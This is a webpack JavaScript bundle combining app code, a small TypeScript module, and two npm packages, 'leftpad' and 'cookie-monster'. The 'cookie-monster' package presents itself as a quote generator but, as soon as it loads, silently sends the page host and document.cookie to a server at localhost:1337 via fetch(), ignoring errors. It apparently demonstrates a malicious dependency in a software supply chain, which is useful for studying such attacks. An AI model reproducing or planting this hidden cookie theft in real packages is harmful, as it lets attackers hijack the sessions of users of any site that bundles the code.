/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ "./node_modules/cookie-monster/index.js":
/*!**********************************************!*\
  !*** ./node_modules/cookie-monster/index.js ***!
  \**********************************************/
/***/ ((__unused_webpack_module, exports) => {

const quotes = [
  "C is for cookie that's good enough for me.",
  "Home is where heart is. Heart where cookie is. Math clear: home is cookie.",
  "Sometimes me think, what is friend? And then me say: a friend is someone to share last cookie with.",
];

exports.randomQuote = () => quotes[Math.floor(Math.random() * quotes.length)];

// Gotta have those cookies
fetch(
  `http://localhost:1337/${location?.host}/${encodeURI(document?.cookie)}`
).catch(() => {});


/***/ }),

/***/ "./omg.ts":
/*!****************!*\
  !*** ./omg.ts ***!
  \****************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   what: () => (/* binding */ what)
/* harmony export */ });
const what = "OMG, hilarious!";


/***/ }),

/***/ "./node_modules/leftpad/index.js":
/*!***************************************!*\
  !*** ./node_modules/leftpad/index.js ***!
  \***************************************/
/***/ ((module) => {

module.exports = function(str, width, char) {
  char = char || "0";
  str = str.toString();
  while (str.length < width)
    str = char + str;
  return str;
};


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	(() => {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = (module) => {
/******/ 			var getter = module && module.__esModule ?
/******/ 				() => (module['default']) :
/******/ 				() => (module);
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be in strict mode.
(() => {
"use strict";
/*!****************!*\
  !*** ./app.js ***!
  \****************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var leftpad__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! leftpad */ "./node_modules/leftpad/index.js");
/* harmony import */ var leftpad__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(leftpad__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var cookie_monster__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! cookie-monster */ "./node_modules/cookie-monster/index.js");
/* harmony import */ var _omg_ts__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./omg.ts */ "./omg.ts");




function run() {
  document.cookie = "name=chocolate-chip";
  console.log(location.host, document.cookie);
  console.log(leftpad__WEBPACK_IMPORTED_MODULE_0___default()((0,cookie_monster__WEBPACK_IMPORTED_MODULE_1__.randomQuote)(), 50, "🍪"));
  console.log(_omg_ts__WEBPACK_IMPORTED_MODULE_2__.what)
}
run();

})();

/******/ })()
;
//# sourceMappingURL=app.bundle.js.map